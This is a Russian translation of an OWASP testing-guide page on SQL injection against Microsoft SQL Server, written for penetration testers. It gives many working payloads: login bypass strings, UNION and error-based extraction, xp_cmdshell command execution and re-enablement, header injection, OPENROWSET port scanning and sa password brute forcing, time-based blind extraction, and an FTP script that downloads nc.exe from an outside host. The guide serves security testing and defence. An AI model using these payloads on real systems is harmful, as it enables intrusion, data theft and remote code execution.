# Тестирование для SQL Server

## Резюме

В этом разделе некоторые [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) Будут обсуждаться методы, использующие определенные функции Microsoft SQL Server.

Уязвимости SQL-инъекций возникают всякий раз, когда ввод используется в конструкции SQL-запроса без адекватного ограничения или дезинфекции. Использование динамического SQL (конструкция запросов SQL путем объединения строк) открывает двери для этих уязвимостей. Инъекция SQL позволяет злоумышленнику получить доступ к серверам SQL и выполнить код SQL под привилегиями пользователя, используемого для подключения к базе данных.

Как объяснено в [SQL injection](https://owasp.org/www-community/attacks/SQL_Injection), эксплойт SQL-инъекции требует двух вещей: точки входа и эксплойта для входа. Любой контролируемый пользователем параметр, который обрабатывается приложением, может скрывать уязвимость. Это включает в себя:

- Параметры приложения в строках запроса (например,.,  GET запросы)
- Параметры приложения включены как часть тела запроса POST
- Информация, связанная с браузером (например,., пользователь-агент, реферер)
- Информация, связанная с хостом (например,., имя хоста, IP)
- Информация, связанная с сессией (например,., идентификатор пользователя, куки)

Сервер Microsoft SQL имеет несколько уникальных характеристик, поэтому некоторые эксплойты необходимо специально настроить для этого приложения.

## Как проверить

### Характеристики SQL Server

Для начала давайте посмотрим на некоторые операторы SQL Server и команды / хранимые процедуры, которые полезны в тесте SQL Injection :

- оператор комментариев: `--` (полезно для того, чтобы заставить запрос игнорировать оставшуюся часть исходного запроса; это не будет необходимо в каждом случае)
- разделитель запросов: `;` (semicolon)
- Полезные хранимые процедуры включают в себя:
    - [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql) выполняет любую командную оболочку на сервере с теми же разрешениями, что и в данный момент. По умолчанию его разрешено использовать только `sysadmin`, а в SQL Server 2005 он по умолчанию отключен (его можно снова включить с помощью sp_configure)
    - `xp_regread` считывает произвольное значение из реестра (недокументированная расширенная процедура)
    - `xp_regwrite` записывает произвольное значение в Реестр (недокументированная расширенная процедура)
    - [sp_makewebtask](https://docs.microsoft.com/en-us/previous-versions/sql/sql-server-2008/ms180099(v=sql.100)) Размножает командную оболочку Windows и передает строку для выполнения. Любой вывод возвращается в виде строк текста. Это требует привилегий `sysadmin`.
    - [xp_sendmail](https://docs.microsoft.com/en-us/previous-versions/sql/sql-server-2008-r2/ms189505(v=sql.105)) Отправляет сообщение электронной почты, которое может включать в себя вложение набора результатов запроса, указанным получателям. Эта расширенная сохраненная процедура использует SQL Mail для отправки сообщения.

Давайте теперь посмотрим на некоторые примеры конкретных атак SQL Server, которые используют вышеупомянутые функции. Большинство из этих примеров будут использовать функцию `exec`.

Ниже мы показываем, как выполнить команду оболочки, которая записывает выходные данные команды `dir c:\ inetpub` в просматриваемом файле, предполагая, что веб-сервер и сервер DB находятся на одном хосте. Следующий синтаксис использует `xp_cmdshell`:

`exec master.dbo.xp_cmdshell 'dir c:\inetpub > c:\inetpub\wwwroot\test.txt'--`

В качестве альтернативы мы можем использовать `sp_makewebtask`:

`exec sp_makewebtask 'C:\Inetpub\wwwroot\test.txt', 'select * from master.dbo.sysobjects'--`

Успешное выполнение создаст файл, который можно просмотреть тестером пера. Имейте в виду, что `sp_makewebtask` устарела, и, даже если он работает во всех версиях SQL Server до 2005 года, он может быть удален в будущем.

Кроме того, встроенные функции SQL Server и переменные среды очень удобны. Ниже используется функция `db_name ()`, чтобы вызвать ошибку, которая вернет имя базы данных:

`/controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20db_name())`

Обратите внимание на использование [convert](https://docs.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql?view=sql-server-2017):

`CONVERT ( data_type [ ( length ) ] , expression [ , style ] )`

`CONVERT` попытается преобразовать результат `db_name` (a string) в целочисленную переменную, запускающую ошибку, которая, если отображается уязвимым приложением, будет содержать имя БД

В следующем примере используется переменная среды `@@version`, в сочетании с `union select`-стиль впрыска, чтобы найти версию SQL Server.

`/form.asp?prop=33%20union%20select%201,2006-01-06,2007-01-06,1,'stat','name1','name2',2006-01-06,1,@@version%20--`

И вот та же атака, но снова используя трюк преобразования :

`/controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20@@VERSION)`

Сбор информации полезен для использования программных уязвимостей на SQL Server посредством использования атаки SQL-инъекции или прямого доступа к слушателю SQL.

Далее мы показываем несколько примеров, которые используют уязвимости SQL-инъекций через разные точки входа.

### Пример 1: Тестирование для SQL-инъекции в запросе GET

Самым простым (и иногда наиболее полезным) случаем может быть случай с страницей входа в систему, запрашивающей имя пользователя и пароль для входа в систему. Вы можете попробовать ввести следующую строку "' or '1'='1" (without double quotes):

`https://vulnerable.web.app/login.asp?Username='%20or%20'1'='1&Password='%20or%20'1'='1`

Если приложение использует динамические запросы SQL, и строка добавляется к запросу проверки учетных данных пользователя, это может привести к успешному входу в приложение.

### Пример 2: Тестирование для SQL-инъекции в запросе GET

Чтобы узнать, сколько существует столбцов

`https://vulnerable.web.app/list_report.aspx?number=001%20UNION%20ALL%201,1,'a',1,1,1%20FROM%20users;--`

### Пример 3: Тестирование в запросе POST

SQL Injection, HTTP POST Content: `email=%27&whichSubmit=submit&submit.x=0&submit.y=0`

Полный пример поста (`https://vulnerable.web.app/forgotpass.asp`):

```txt
POST /forgotpass.asp HTTP/1.1
Host: vulnerable.web.app
[...]
Referer: http://vulnerable.web.app/forgotpass.asp
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

email=%27&whichSubmit=submit&submit.x=0&submit.y=0
```

Сообщение об ошибке получено при `'` (single quote) символ вводится в поле электронной почты:

```txt
Microsoft OLE DB Provider for SQL Server error '80040e14'
Unclosed quotation mark before the character string '' '.
/forgotpass.asp, line 15
```

### Пример 4: Еще один (полезный) пример GET

Получение исходного кода приложения

`a' ; master.dbo.xp_cmdshell ' copy c:\inetpub\wwwroot\login.aspx c:\inetpub\wwwroot\login.txt';--`

### Example 5: Custom `xp_cmdshell`

Все книги и статьи, описывающие лучшие практики безопасности для SQL Server, рекомендуют отключить `xp_cmdshell` в SQL Server 2000 (в SQL Server 2005 он отключен по умолчанию). Однако, если у нас есть права sysadmin (условно или путем грубого заполнения пароля sysadmin, см. Ниже), мы часто можем обойти это ограничение.

На SQL Server 2000 :

- Если `xp_cmdshell` был отключен с `sp_dropextendproc`, мы можем просто ввести следующий код:

`sp_addextendedproc 'xp_cmdshell','xp_log70.dll'`

- Если предыдущий код не работает, это означает, что `xp_log70.dll` был перемещен или удален. В этом случае нам нужно ввести следующий код:

```sql
CREATE PROCEDURE xp_cmdshell(@cmd varchar(255), @Wait int = 0) AS
    DECLARE @result int, @OLEResult int, @RunResult int
    DECLARE @ShellID int
    EXECUTE @OLEResult = sp_OACreate 'WScript.Shell', @ShellID OUT
    IF @OLEResult <> 0 SELECT @result = @OLEResult
    IF @OLEResult <> 0 RAISERROR ('CreateObject %0X', 14, 1, @OLEResult)
    EXECUTE @OLEResult = sp_OAMethod @ShellID, 'Run', Null, @cmd, 0, @Wait
    IF @OLEResult <> 0 SELECT @result = @OLEResult
    IF @OLEResult <> 0 RAISERROR ('Run %0X', 14, 1, @OLEResult)
    EXECUTE @OLEResult = sp_OADestroy @ShellID
    return @result
```

Этот код, написанный Антонином Фоллером (см. Ссылки внизу страницы), создает новый `xp_cmdshell` с использованием `sp_oacreate`, `sp_oamethod` и `sp_oadestroy` (если они тоже не были отключены, конечно). Перед его использованием нам нужно удалить первую созданную нами `xp_cmdshell` (даже если она не работала), в противном случае эти две декларации столкнутся.

На SQL Server 2005 `xp_cmdshell` можно включить, введя вместо этого следующий код:

```sql
master..sp_configure 'show advanced options',1
reconfigure
master..sp_configure 'xp_cmdshell',1
reconfigure
```

### Пример 6: Referer / User-Agent

Заголовок `REFERER` установлен на :

`Referer: https://vulnerable.web.app/login.aspx', 'user_agent', 'some_ip'); [SQL CODE]--`

Позволяет выполнять произвольный код SQL. То же самое происходит с заголовком User-Agent, установленным в:

`User-Agent: user_agent', 'some_ip'); [SQL CODE]--`

### Пример 7: SQL Server как сканер портов

В SQL Server одной из наиболее полезных (по крайней мере, для тестера проникновения) команд является OPENROWSET, который используется для запуска запроса на другом DB Server и получения результатов. Тестер проникновения может использовать эту команду для сканирования портов других машин в целевой сети, вводя следующий запрос:

`select * from OPENROWSET('SQLOLEDB','uid=sa;pwd=foobar;Network=DBMSSOCN;Address=x.y.w.z,p;timeout=5','select 1')--`

Этот запрос будет пытаться подключиться к адресу x.y.w.z на порту p. Если порт закрыт, будет возвращено следующее сообщение:

`SQL Server does not exist or access denied`

С другой стороны, если порт открыт, будет возвращена одна из следующих ошибок:

`General network error. Check your network documentation`

`OLE DB provider 'sqloledb' reported an error. The provider did not give any information about the error.`

Конечно, сообщение об ошибке не всегда доступно. Если это так, мы можем использовать время отклика, чтобы понять, что происходит: при закрытом порту время ожидания (5 секунд в этом примере) будет использовано, тогда как открытый порт вернет результат сразу.

Имейте в виду, что OPENROWSET включен по умолчанию в SQL Server 2000, но отключен в SQL Server 2005.

### Пример 8: Загрузка исполняемых файлов

Как только мы сможем использовать `xp_cmdshell` (собственный или пользовательский), мы можем легко загрузить исполняемые файлы на целевой сервер DB. Очень распространенным выбором является `netcat.exe`, но любой троян будет полезен здесь. Если цели разрешено запускать FTP-соединения с машиной тестера, все, что нужно, это ввести следующие запросы:

```sql
exec master..xp_cmdshell 'echo open ftp.tester.org > ftpscript.txt';--
exec master..xp_cmdshell 'echo USER >> ftpscript.txt';--
exec master..xp_cmdshell 'echo PASS >> ftpscript.txt';--
exec master..xp_cmdshell 'echo bin >> ftpscript.txt';--
exec master..xp_cmdshell 'echo get nc.exe >> ftpscript.txt';--
exec master..xp_cmdshell 'echo quit >> ftpscript.txt';--
exec master..xp_cmdshell 'ftp -s:ftpscript.txt';--
```

На этом этапе `nc.exe` будет загружен и доступен.

Если брандмауэр не разрешает FTP, у нас есть обходной путь, который использует отладчик Windows, `debug.exe`, который устанавливается по умолчанию на всех компьютерах Windows. `Debug.exe` можно выполнить скриптом и создать исполняемый файл, выполнив соответствующий файл скрипта. Нам нужно преобразовать исполняемый файл в сценарий отладки (который представляет собой 100% файл ASCII), загрузить его построчно и, наконец, вызвать на нем `debug.exe`. Существует несколько инструментов, которые создают такие отладочные файлы (например,.: `makescr.exe` от Ollie Whitehouse и `dbgtool.exe` от `toolcrypt.org`). Поэтому запросы для введения будут следующими:

```sql
exec master..xp_cmdshell 'echo [debug script line #1 of n] > debugscript.txt';--
exec master..xp_cmdshell 'echo [debug script line #2 of n] >> debugscript.txt';--
....
exec master..xp_cmdshell 'echo [debug script line #n of n] >> debugscript.txt';--
exec master..xp_cmdshell 'debug.exe < debugscript.txt';--
```

На данный момент наш исполняемый файл доступен на целевом компьютере и готов к исполнению. Существуют инструменты, которые автоматизируют этот процесс, в частности `Bobcat`, который работает в Windows, и `Sqlninja`, который работает в Unix (см. Инструменты в нижней части этой страницы).

### Получить информацию, когда она не отображается (вне группы)

Не все теряется, когда веб-приложение не возвращает никакой информации, такой как описательные сообщения об ошибках (см. [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)). Например, может случиться так, что у вас есть доступ к исходному коду (например,.потому что веб-приложение основано на программном обеспечении с открытым исходным кодом). Затем тестер пера может использовать все уязвимости SQL-инъекций, обнаруженные в автономном режиме в веб-приложении. Хотя IPS может остановить некоторые из этих атак, лучшим способом будет действовать следующим образом: разработать и протестировать атаки на испытательном стенде, созданном для этой цели, а затем выполнить эти атаки на тестируемое веб-приложение.

Другие варианты внеполосных атак описаны в [Sample 4 above](#Example-4:-Yet-Another-(Useful)-GET-Example).

### Слепые атаки SQL-инъекций

#### Испытание и ошибка

В качестве альтернативы можно играть счастливчиком. То есть злоумышленник может предположить, что в веб-приложении есть скрытая или внеполосная уязвимость SQL-инъекции. Затем он выберет вектор атаки (например,., веб-запись), [use fuzz vectors](../../6-Appendix/C-Fuzz_Vectors.md) против этого канала и смотреть ответ. Например, если веб-приложение ищет книгу с помощью запроса

```sql
select * from books where title="text entered by the user"
```

тогда тестер проникновения может ввести текст: `'Bomba' OR 1=1-` и если данные не будут должным образом проверены, запрос пройдет и вернет весь список книг. Это свидетельствует о уязвимости SQL-инъекции. Тестер проникновения может позже «играть» с запросами, чтобы оценить критичность этой уязвимости.

#### Если отображено несколько сообщений об ошибках

С другой стороны, если нет предварительной информации, все еще есть возможность атаковать, используя любой «скрытый канал». Может случиться так, что описательные сообщения об ошибках остановлены, но сообщения об ошибках дают некоторую информацию. Например:

- В некоторых случаях веб-приложение (фактически веб-сервер) может возвращать традиционный `500: Internal Server Error`, скажем, когда приложение возвращает исключение, которое может быть сгенерировано, например, запросом с незакрытыми кавычками.
- В то время как в других случаях сервер будет возвращать сообщение `200 OK`, но веб-приложение вернет сообщение об ошибке, вставленное разработчиками `Внутренняя ошибка сервера` или `плохие данные`.

Этого одного бита информации может быть достаточно, чтобы понять, как динамический запрос SQL создается веб-приложением, и настроить эксплойт. Другой внеполосный метод - выводить результаты через файлы HTTP для просмотра.

#### Временные атаки

Существует еще одна возможность для создания слепой атаки SQL-инъекций, когда нет видимой обратной связи от приложения: путем измерения времени, которое веб-приложение занимает для ответа на запрос. Атака такого рода есть [described by Anley](http://www.encription.co.uk/downloads/more_advanced_sql_injection.pdf) откуда мы берем следующие примеры. Типичный подход использует команду `waitfor delay`: скажем, злоумышленник хочет проверить, существует ли база данных «pubs», он просто введет следующую команду:

`if exists (select * from pubs..pub_info) waitfor delay '0:0:5'`

В зависимости от времени, которое запрос занимает для возврата, мы узнаем ответ. Фактически, у нас есть две вещи: «уязвимость SQL-инъекции» и «скрытый канал», который позволяет тестеру проникновения получать 1 бит информации для каждого запроса. Следовательно, используя несколько запросов (столько запросов, сколько битов в требуемой информации), тестер пера может получить любые данные, которые находятся в базе данных. Посмотрите на следующий запрос

```sql
declare @s varchar(8000)
declare @i int
select @s = db_name()
select @i = [some value]
if (select len(@s)) < @i waitfor delay '0:0:5'
```

Измеряя время отклика и используя разные значения для `@ i`, мы можем определить длину имени текущей базы данных, а затем начать извлекать само имя с помощью следующего запроса:

`if (ascii(substring(@s, @byte, 1)) & ( power(2, @bit))) > 0 waitfor delay '0:0:5'`

Этот запрос будет ждать 5 секунд, если бит `@bit` байта `@byte` имени текущей базы данных равен 1, и будет возвращаться сразу, если он равен 0. Вложив два цикла (один для `@byte` и один для `@bit`), мы сможем извлечь всю информацию.

Однако может случиться так, что команда `waitfor` недоступна (например,.потому что он фильтруется брандмауэром IPS / веб-приложения). Это не означает, что слепые атаки SQL-инъекций не могут быть выполнены, так как тестер пера должен придумывать только любую трудоемкую операцию, которая не фильтруется. Например

```sql
declare @i int select @i = 0
while @i < 0xaffff begin
select @i = @i + 1
end
```

#### Проверка версии и уязвимости

Тот же подход к синхронизации можно использовать и для понимания того, с какой версией SQL Server мы имеем дело. Конечно, мы будем использовать встроенную переменную `@@version`. Рассмотрим следующий запрос:

`select @@version`

На SQL Server 2005 он вернет что-то вроде следующего:

`Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) Oct 14 2005 00:33:37`

Часть строки `2005` простирается от 22-го до 25-го символа. Поэтому один запрос для введения может быть следующим:

`if substring((select @@version),25,1) = 5 waitfor delay '0:0:5'`

Такой запрос будет ждать 5 секунд, если 25-й символ переменной `@@version` будет `5`, показывая нам, что мы имеем дело с SQL Server 2005. Если запрос немедленно вернется, мы, вероятно, имеем дело с SQL Server 2000, и другой подобный запрос поможет устранить все сомнения.

### Пример 9: Bruteforce Sysadmin Password

Чтобы использовать пароль sysadmin, мы можем использовать тот факт, что «OPENROWSET» нуждается в надлежащих учетных данных для успешного выполнения соединения и что такое соединение также может быть «зациклито» на локальном DB Server. Комбинируя эти функции с инъекцией с привязкой в зависимости от времени отклика, мы можем ввести следующий код:

`select * from OPENROWSET('SQLOLEDB','';'sa';'<pwd>','select 1;waitfor delay ''0:0:5'' ')`

Здесь мы пытаемся установить соединение с локальной базой данных (указанной пустым полем после `SQLOLEDB`), используя `sa` и `<pwd> `в качестве учетных данных. Если пароль правильный и соединение успешное, запрос выполняется, что заставляет DB ждать 5 секунд (а также возвращает значение, поскольку OPENROWSET ожидает хотя бы один столбец). При извлечении паролей кандидатов из списка слов и измерении времени, необходимого для каждого соединения, мы можем попытаться угадать правильный пароль. В «Манитировании данных с помощью SQL-инъекции и вывода» Дэвид Личфилд продвигает эту технику еще дальше, вводя фрагмент кода, чтобы выполнить грубое форсирование пароля sysadmin с использованием ресурсов ЦП самого DB Server.

Как только у нас есть пароль sysadmin, у нас есть два варианта:

- Введите все следующие запросы, используя `OPENROWSET`, чтобы использовать привилегии sysadmin
- Добавьте нашего текущего пользователя в группу sysadmin, используя `sp_addsrvrolemember`. Текущее имя пользователя может быть извлечено с помощью ввода вывода в переменную `system_user`.

Помните, что OPENROWSET доступен для всех пользователей на SQL Server 2000, но он ограничен административными учетными записями на SQL Server 2005.

## Tools

- [Bernardo Damele A. G.: sqlmap, automatic SQL injection tool](https://sqlmap.org/)

## References

### Whitepapers

- [David Litchfield: "Data-mining with SQL Injection and Inference"](https://dl.packetstormsecurity.net/papers/attack/sqlinference.pdf)
- [Chris Anley, "(more) Advanced SQL Injection"](https://www.cgisecurity.com/lib/more_advanced_sql_injection.pdf)
- [Steve Friedl's Unixwiz.net Tech Tips: "SQL Injection Attacks by Example"](http://www.unixwiz.net/techtips/sql-injection.html)
- [Alexander Chigrik: "Useful undocumented extended stored procedures"](https://www.databasejournal.com/features/mssql/article.php/1441251/Useful-Undocumented-Extended-Stored-Procedures.htm)
- [Antonin Foller: "Custom xp_cmdshell, using shell object"](https://www.motobit.com/tips/detpg_cmdshell)
- [SQL Injection](https://www.cisecurity.org/wp-content/uploads/2017/05/SQL-Injection-White-Paper.pdf)
- [Cesar Cerrudo: Manipulating Microsoft SQL Server Using SQL Injection, uploading files, getting into internal network, port scanning, DOS](https://www.cgisecurity.com/lib/Manipulating_SQL_Server_Using_SQL_Injection.pdf)
